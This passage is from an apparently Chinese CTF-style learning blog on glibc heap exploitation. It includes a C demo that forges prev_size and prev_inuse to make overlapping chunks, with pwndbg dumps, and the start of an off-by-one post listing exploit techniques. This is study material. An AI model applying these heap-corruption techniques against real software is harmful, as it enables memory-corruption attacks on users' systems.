class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602060</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602080</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0xa30313032303678</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602490</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134001</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>再分配一次</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">97</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602060</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602080</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0xa30313032303678</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602490</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134001</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此时</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">20</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000061</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602050</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602070</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><br><span class="hljs-number">0x602090</span>:       <span class="hljs-number">0</span>x303a7274705d2a5b      <span class="hljs-number">0</span>x0a303<span class="hljs-number">13032303678</span><br></code></pre></td></tr></table></figure><p>这时就可以进行fastbin attack了</p><h3 id="通过extend进行前向合并"><a href="#通过extend进行前向合并" class="headerlink" title="通过extend进行前向合并"></a>通过extend进行前向合并</h3><p>之前的后向合并都是通过更改size实现的,但extend的前向合并则不一样,但原理是类似的<br>后向合并是通过更改size实现的,而前向合并顾名思义需要我们更改pre_size才行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3,*ptr4,*ptr5;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//防止与top合并</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr1:%p\n&quot;</span>,ptr1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr2:%p\n&quot;</span>,ptr2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr3:%p\n&quot;</span>,ptr3);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr4:%p\n&quot;</span>,ptr4);<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;<span class="hljs-comment">//修改pre_inuse域</span><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;<span class="hljs-comment">//修改pre_size域</span><br>    <span class="hljs-built_in">free</span>(ptr4);<span class="hljs-comment">//unlink进行前向extend</span><br>    ptr5=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);<span class="hljs-comment">//占位块</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr5:%p\n&quot;</span>,ptr5);<br>&#125;<br></code></pre></td></tr></table></figure><p>先看程序的运行结果:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile">╰─<span class="hljs-comment"># ./pwn</span><br><span class="hljs-section">[*]ptr1:0x10c2010</span><br><span class="hljs-section">[*]ptr2:0x10c20a0</span><br><span class="hljs-section">[*]ptr3:0x10c20c0</span><br><span class="hljs-section">[*]ptr4:0x10c20e0</span><br><span class="hljs-section">[*]ptr5:0x10c2010</span><br></code></pre></td></tr></table></figure><p>然后再调试一下,这次我断点下在了第一free的地方</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602090</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x6020b0</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x91</span><br>&#125;<br><span class="hljs-number">0x6020d0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602160</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x411</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们的符合smallbin和fastbin的四个chunk已经分配完成了,然后先free掉ptr1,修改ptr4的pre_inuse和pre_size</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">20</span>gx ptr4-<span class="hljs-number">0</span>x10<br><span class="hljs-number">0x6020d0</span>:       <span class="hljs-number">0</span>x000000<span class="hljs-number">00000000d0</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000090</span><br><span class="hljs-number">0x6020e0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020f0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602100</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602110</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602120</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602130</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602140</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602150</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602160</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br></code></pre></td></tr></table></figure><p>这里已经改好了,然后进行free(ptr4),此时的heap</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">353</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602160</span> &#123;<br>  prev_size = <span class="hljs-number">352</span>,<br>  size = <span class="hljs-number">32</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602180</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x3a347274705d2a5b</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x3065303230367830</span>,<br>  fd_nextsize = <span class="hljs-number">0xa</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602590</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133745</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此时的bins:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x602000<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>然后再分配</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">353</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602160</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">352</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602180</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x3a347274705d2a5b</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x3065303230367830</span>,<br>  fd_nextsize = <span class="hljs-number">0xa</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602590</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133745</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>成功跨多域进行分配</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602010</span>-<span class="hljs-number">0</span>x10<br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000161</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00007ffff7dd1b78      <span class="hljs-number">0</span>x00007ffff7dd1b78<br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>over~ 得,乖乖回去写off-by-one去了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>off-by-one</title>
    <link href="/2019/07/24/off-by-one/"/>
    <url>/2019/07/24/off-by-one/</url>
    
    <content type="html"><![CDATA[<h1 id="参考学习师傅们的文章"><a href="#参考学习师傅们的文章" class="headerlink" title="参考学习师傅们的文章"></a>参考学习师傅们的文章</h1><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/<br><span class="hljs-symbol">http:</span>//d<span class="hljs-number">0</span>m<span class="hljs-number">021</span>ng.github.io/<span class="hljs-number">2017</span>/<span class="hljs-number">03</span>/<span class="hljs-number">01</span>/PWN/Linux<span class="hljs-variable">%E5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%86</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%E4</span><span class="hljs-variable">%B9</span><span class="hljs-variable">%8</span>Boff-by-<span class="hljs-keyword">one</span>/<br><span class="hljs-symbol">https:</span>//www.anquanke.com/post/id/<span class="hljs-number">88961</span>#h<span class="hljs-number">2</span><span class="hljs-number">-5</span><br><span class="hljs-symbol">https:</span>//blog.csdn.net/nibiru_holmes/article/details/<span class="hljs-number">62040763</span><br><span class="hljs-symbol">https:</span>//www.w<span class="hljs-number">0</span>lfzhang.com/<span class="hljs-number">2016</span>/<span class="hljs-number">10</span>/<span class="hljs-number">21</span>/off-by-<span class="hljs-keyword">one</span>/<br><span class="hljs-symbol">https:</span>//github.com/JnuSimba/LinuxSecNotes/blob/master/Linux<span class="hljs-variable">%20</span>X<span class="hljs-number">86</span><span class="hljs-variable">%20</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%94</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%97</span>/<span class="hljs-variable">%E5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%86</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%86</span><span class="hljs-variable">%85</span>off-by-<span class="hljs-keyword">one</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%94</span><span class="hljs-variable">%A8.md</span><br></code></pre></td></tr></table></figure><h1 id="off-by-one-漏洞利用学习"><a href="#off-by-one-漏洞利用学习" class="headerlink" title="off-by-one 漏洞利用学习"></a>off-by-one 漏洞利用学习</h1><blockquote><p>一直没能学会off-by-one这一个神奇的漏洞利用方式,这一次终于有机会默默学习一下了</p></blockquote><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>通过利用手法分类可以分为两类:</p><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><ul><li><p>off-by-one overwrite allocated</p></li><li><p>off-by-one overwrite freed</p></li><li><p>off-by-one null byte</p></li></ul><h3 id="unlink-相关内容我也在之前的博客中有所提及"><a href="#unlink-相关内容我也在之前的博客中有所提及" class="headerlink" title="unlink(相关内容我也在之前的博客中有所提及)"></a>unlink(相关内容我也在之前的博客中有所提及)</h3><ul><li><p>off-by-one small bin</p></li><li><p>off-by-one large bin<br>而通过漏洞成因可以分为下面两类:</p></li><li><p>off-by-one NULL(溢出位为0)</p></li><li><p>off-by-one byte(溢出位可以为任意字节)</p></li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出位为任意字节时,可以利用chunk extended和chunk shrink来进行利用(这两种相关内容在我的另外两篇博客中都有一些描述)</li><li>溢出位为NULL的时候:在特殊size下(0x100)的时候,如果溢出null可以让prev_in_use位被清零,前块就被视为free状态,此时可以<ol><li>使用unlink方法</li><li>这里也可以通过chunk extedned和chunk shrink来解决(仅限于libc&lt;2.28)</li></ol></li></ol><p>在2.28之前的时候unlink是不对prev_size找到的chunk与当前chunk大小进行比较的</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 